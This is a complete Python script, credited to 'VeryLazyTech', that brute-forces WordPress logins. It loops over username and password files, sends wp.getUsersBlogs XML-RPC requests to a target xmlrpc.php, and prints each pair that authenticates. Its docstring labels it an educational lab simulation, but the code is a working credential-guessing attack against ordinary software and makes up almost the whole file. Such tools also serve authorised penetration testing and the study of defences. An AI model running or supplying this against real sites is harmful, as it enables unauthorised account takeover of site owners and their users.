"""
WordPress XML-RPC Brute-Force Tool 
----------------------------------------------------

Description:
This script is designed to simulate a brute-force attack on WordPress XML-RPC
(`wp.getUsersBlogs`) in a controlled lab environment. It reads usernames and
passwords from files and attempts authentication via XML-RPC.

Usage:
    python3 wp_xmlrpc_bruteforce.py -u http://target.com/xmlrpc.php -U users.txt -P passwords.txt

Arguments:
    -u : URL to the target WordPress XML-RPC (e.g., http://localhost/wordpress/xmlrpc.php)
    -U : File containing usernames (one per line)
    -P : File containing passwords (one per line)

Author: VeryLazyTech
Site: https://www.verylazytech.com

Note:
- For educational and lab purposes only.
- Ensure you have permission to test any target site.
- If packages are missing, the script will suggest installing them with pip.
"""

import sys
from colorama import init, Fore
import requests
import argparse

init(autoreset=True)

required_packages = ["requests", "colorama", "argparse"]
missing_packages = []

for pkg in required_packages:
    try:
        __import__(pkg)
    except ImportError:
        missing_packages.append(pkg)

if missing_packages:
    print(f"Missing packages: {', '.join(missing_packages)}")
    print("Install them with this command:")
    print(f"pip install {' '.join(missing_packages)}")
    sys.exit(1)

print(Fore.YELLOW +f"""
 _                   __  __          _ ____             
| |    __ _ _____   _\ \/ /_ __ ___ | |  _ \ _ __   ___ 
| |   / _` |_  / | | |\  /| '_ ` _ \| | |_) | '_ \ / __|
| |__| (_| |/ /| |_| |/  \| | | | | | |  _ <| |_) | (__ 
|_____\__,_/___|\__, /_/\_\_| |_| |_|_|_| \_\ .__/ \___|
                |___/                       |_|         
                  @VeryLazyTech
""")

# ===== ARGUMENT PARSER =====
parser = argparse.ArgumentParser(description="WordPress XML-RPC Brute Force Lab Simulation")
parser.add_argument("-u", "--url", required=True, help="Target WordPress xmlrpc.php URL, e.g., http://localhost/wordpress/xmlrpc.php")
parser.add_argument("-U", "--users", required=True, help="File containing usernames (one per line)")
parser.add_argument("-P", "--passwords", required=True, help="File containing passwords (one per line)")
args = parser.parse_args()

xmlrpc_url = args.url
users_file = args.users
passwords_file = args.passwords

# ===== LOAD USERS AND PASSWORDS =====
print(Fore.GREEN + f"Load usernames and passwords...")
with open(users_file, "r") as f:
    users = [line.strip() for line in f.readlines()]

with open(passwords_file, "r") as f:
    passwords = [line.strip() for line in f.readlines()]

# ===== FUNCTION TO ESCAPE XML-RPC SPECIAL CHARACTERS =====
def escape_xmlrpc(value):
    return value.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

headers = {"Content-Type": "text/xml"}

# ===== BRUTE-FORCE LOOP =====
print(Fore.GREEN + f"SStarting brute-force. Now's your time to be laZy...")
for user in users:
    for password in passwords:
        user_esc = escape_xmlrpc(user)
        password_esc = escape_xmlrpc(password)

        payload = f"""<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{user_esc}</string></value></param>
    <param><value><string>{password_esc}</string></value></param>
  </params>
</methodCall>
"""

        response = requests.post(xmlrpc_url, data=payload.encode("utf-8"), headers=headers)

        if b"<methodResponse>" in response.content and b"faultCode" not in response.content:
            print(Fore.GREEN + f"[SUCCESS] {user}:{password}")
        else:
            print(Fore.RED + f"[FAIL] {user}:{password}", end='\r', flush=True)

